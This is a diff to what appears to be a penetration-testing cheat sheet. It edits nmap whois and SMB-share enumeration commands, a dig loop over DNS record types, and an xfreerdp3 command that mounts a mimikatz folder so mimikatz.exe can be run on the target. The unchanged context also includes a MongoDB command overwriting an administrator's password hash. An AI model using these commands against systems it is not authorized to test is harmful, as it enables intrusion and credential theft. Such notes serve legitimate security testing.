@@ -306,10 +306,10 @@ sudo nmap -n -Pn -sS -sV \
   <TARGET>
 
 # whois
-nmap -n -Pn -sn --script whois-domain oA whois <TARGET_DOMAIN>
+nmap -n -Pn -sn --script whois-domain -oA nmap_whois <TARGET_DOMAIN>
 
 # Attempts to list available SMB shares on the target
-nmap -p 445 --script smb-enum-shares -oA smb_shares <TARGET>
+nmap -p 445 --script smb-enum-shares -oA nmap_smb_shares <TARGET>
 ```
 
 #### 🔍 Additional Service Scans
@@ -408,7 +408,7 @@ dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE> > dns.txt
 # TXT: Text Records
 # SRV: Service Records
 # CAA: Certification Authority Authorization
-for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> >> dns_all_records.txt ; done
+for type in A AAAA CNAME MX NS SOA SRV TXT CAA ; do echo '---' ; dig @<DNS_SERVER> +short $type <TARGET> | tee -a dns_all_records.txt ; done
 
 # IP -> DNS
 dig -x <IP_ADDR> > dns_reverse.txt
@@ -2255,7 +2255,7 @@ db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } 
 
 ```bash
 # Connects to RDP and mounts share
-xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
+xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
 
 \\tsclient\share\mimikatz.exe
 ```
